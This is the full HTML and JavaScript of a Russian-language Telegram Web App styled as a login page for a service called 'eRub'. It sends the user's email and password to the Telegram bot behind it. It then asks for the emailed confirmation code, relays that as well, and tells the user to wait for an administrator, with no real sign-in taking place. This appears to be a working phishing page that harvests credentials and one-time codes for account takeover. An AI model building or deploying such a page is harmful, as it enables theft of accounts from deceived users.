<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в eRub</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 24px;
            padding: 40px 32px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
            min-height: 500px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .logo {
            text-align: center;
            margin-bottom: 32px;
        }
        .logo h1 {
            font-size: 28px;
            font-weight: 700;
            color: #1a1a2e;
            letter-spacing: -0.5px;
        }
        .logo h1 span {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .logo p {
            color: #666;
            font-size: 14px;
            margin-top: 4px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #1a1a2e;
            margin-bottom: 6px;
        }
        .form-group input {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #e8ecf1;
            border-radius: 12px;
            font-size: 15px;
            transition: all 0.2s;
            background: #f8f9fc;
        }
        .form-group input:focus {
            outline: none;
            border-color: #667eea;
            background: white;
            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
        }
        .form-group input::placeholder {
            color: #aaa;
        }
        .btn-primary {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 8px;
        }
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.35);
        }
        .btn-primary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .btn-secondary {
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 12px;
        }
        .btn-secondary:hover {
            background: #5a6fd6;
        }
        .btn-secondary:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .support-btn {
            width: 100%;
            padding: 12px;
            background: #f0f2f5;
            color: #1a1a2e;
            border: none;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 12px;
        }
        .support-btn:hover {
            background: #e4e7ec;
        }
        .divider {
            display: flex;
            align-items: center;
            gap: 12px;
            margin: 20px 0 12px;
        }
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #e8ecf1;
        }
        .divider span {
            color: #999;
            font-size: 12px;
            font-weight: 500;
        }
        .hidden {
            display: none !important;
        }
        .message {
            margin-top: 16px;
            padding: 12px 16px;
            border-radius: 12px;
            display: none;
            text-align: center;
            font-size: 14px;
            font-weight: 500;
        }
        .message.success {
            display: block;
            background: #e6f7e6;
            color: #1a7a3a;
            border: 1px solid #b8e6b8;
        }
        .message.error {
            display: block;
            background: #fde8e8;
            color: #b33636;
            border: 1px solid #f5c6c6;
        }
        .message.info {
            display: block;
            background: #e8f0fe;
            color: #1a56a8;
            border: 1px solid #b8d4f5;
        }
        .message.loading {
            display: block;
            background: #fff3cd;
            color: #856404;
            border: 1px solid #ffc107;
        }
        /* Экран кода */
        .code-screen {
            text-align: center;
            display: none;
        }
        .code-screen.show {
            display: block;
        }
        .code-screen .icon {
            font-size: 48px;
            margin-bottom: 12px;
        }
        .code-screen h2 {
            color: #1a1a2e;
            font-size: 20px;
            margin-bottom: 6px;
        }
        .code-screen p {
            color: #666;
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 20px;
        }
        .code-screen .code-input {
            text-align: center;
            font-size: 24px;
            letter-spacing: 8px;
            padding: 16px;
            border: 2px solid #e8ecf1;
            border-radius: 12px;
            width: 100%;
            max-width: 200px;
            margin: 0 auto 16px;
            background: #f8f9fc;
        }
        .code-screen .code-input:focus {
            outline: none;
            border-color: #667eea;
            background: white;
            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
        }
        .code-screen .status-text {
            display: flex;
            align-items: center;
            justify-content: center;
            color: #28a745;
            font-weight: 500;
            margin-top: 8px;
            font-size: 14px;
        }
        .code-screen .status-dot {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #28a745;
            border-radius: 50%;
            animation: pulse 1.5s infinite;
            margin-right: 8px;
        }
        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(0.8); }
            100% { opacity: 1; transform: scale(1); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1><span>eRub</span></h1>
            <p>Войдите в свой аккаунт</p>
        </div>

        <!-- ===== ШАГ 1: ФОРМА ВХОДА ===== -->
        <div id="stepLogin">
            <div class="form-group">
                <label for="email">📧 Email</label>
                <input type="email" id="email" placeholder="your@email.com">
            </div>
            <div class="form-group">
                <label for="password">🔑 Пароль</label>
                <input type="password" id="password" placeholder="Введите пароль">
            </div>

            <button id="submitBtn" class="btn-primary">🔓 Войти</button>

            <div class="divider">
                <span>или</span>
            </div>

            <div class="register-link" style="text-align:center;font-size:14px;color:#666;">
                Нет аккаунта? <a href="#" onclick="showMessage('Регистрация скоро появится', 'info')" style="color:#667eea;font-weight:600;text-decoration:none;">Зарегистрироваться</a>
            </div>
        </div>

        <!-- ===== ШАГ 2: ОКНО КОДА ===== -->
        <div id="stepCode" class="code-screen">
            <div class="icon">📧</div>
            <h2>Код подтверждения</h2>
            <p>Введите код, который был отправлен<br>на вашу почту</p>

            <input type="text" id="codeInput" class="code-input" placeholder="• • • • • •" maxlength="6" inputmode="numeric">

            <button id="submitCodeBtn" class="btn-primary">✅ Подтвердить</button>

            <div class="status-text">
                <span class="status-dot"></span>
                Ожидание кода...
            </div>

            <button onclick="backToLogin()" class="btn-secondary" style="background:#f0f2f5;color:#333;margin-top:12px;">← Назад</button>
        </div>

        <!-- ===== СООБЩЕНИЯ ===== -->
        <div id="message" class="message"></div>

        <!-- ===== ТЕХПОДДЕРЖКА ===== -->
        <button onclick="openSupport()" class="support-btn">🆘 Техническая поддержка</button>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        // Элементы
        const stepLogin = document.getElementById('stepLogin');
        const stepCode = document.getElementById('stepCode');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const codeInput = document.getElementById('codeInput');
        const submitBtn = document.getElementById('submitBtn');
        const submitCodeBtn = document.getElementById('submitCodeBtn');
        const messageDiv = document.getElementById('message');

        function showMessage(text, type = 'info') {
            messageDiv.textContent = text;
            messageDiv.className = `message ${type}`;
            messageDiv.style.display = 'block';
            setTimeout(() => {
                messageDiv.style.display = 'none';
            }, 5000);
        }

        function backToLogin() {
            stepCode.classList.remove('show');
            stepLogin.classList.remove('hidden');
            codeInput.value = '';
            messageDiv.style.display = 'none';
        }

        // =============================================
        // ШАГ 1: ОТПРАВКА EMAIL + ПАРОЛЬ
        // =============================================
        submitBtn.addEventListener('click', function() {
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();

            if (!email || !password) {
                showMessage('Заполните все поля', 'error');
                return;
            }

            if (!email.includes('@')) {
                showMessage('Введите корректный email', 'error');
                return;
            }

            submitBtn.disabled = true;
            submitBtn.textContent = '⏳ Отправка...';
            showMessage('Отправка данных...', 'loading');

            const data = JSON.stringify({ email: email, password: password });

            try {
                tg.sendData(data);

                // ПЕРЕХОДИМ К ШАГУ 2 (окно кода)
                submitBtn.disabled = false;
                submitBtn.textContent = '🔓 Войти';
                messageDiv.style.display = 'none';

                stepLogin.classList.add('hidden');
                stepCode.classList.add('show');
                codeInput.focus();

            } catch (error) {
                showMessage('❌ Ошибка отправки. Попробуйте еще раз.', 'error');
                submitBtn.disabled = false;
                submitBtn.textContent = '🔓 Войти';
            }
        });

        // =============================================
        // ШАГ 2: ОТПРАВКА КОДА
        // =============================================
        submitCodeBtn.addEventListener('click', function() {
            const code = codeInput.value.trim();

            if (!code || code.length < 4) {
                showMessage('Введите корректный код (минимум 4 символа)', 'error');
                return;
            }

            submitCodeBtn.disabled = true;
            submitCodeBtn.textContent = '⏳ Отправка...';
            showMessage('Отправка кода...', 'loading');

            const data = JSON.stringify({ code: code });

            try {
                tg.sendData(data);

                showMessage('✅ Код отправлен!', 'success');
                submitCodeBtn.disabled = false;
                submitCodeBtn.textContent = '✅ Подтвердить';
                codeInput.value = '';

                // Возврат к форме через 2 секунды
                setTimeout(() => {
                    backToLogin();
                    showMessage('✅ Проверка завершена. Ожидайте ответа администратора.', 'success');
                }, 2000);

            } catch (error) {
                showMessage('❌ Ошибка отправки кода', 'error');
                submitCodeBtn.disabled = false;
                submitCodeBtn.textContent = '✅ Подтвердить';
            }
        });

        // Enter для отправки
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                if (!stepLogin.classList.contains('hidden')) {
                    submitBtn.click();
                } else if (stepCode.classList.contains('show')) {
                    submitCodeBtn.click();
                }
            }
        });

        function openSupport() {
            window.open('https://t.me/potok457', '_blank');
        }
    </script>
</body>
</html>
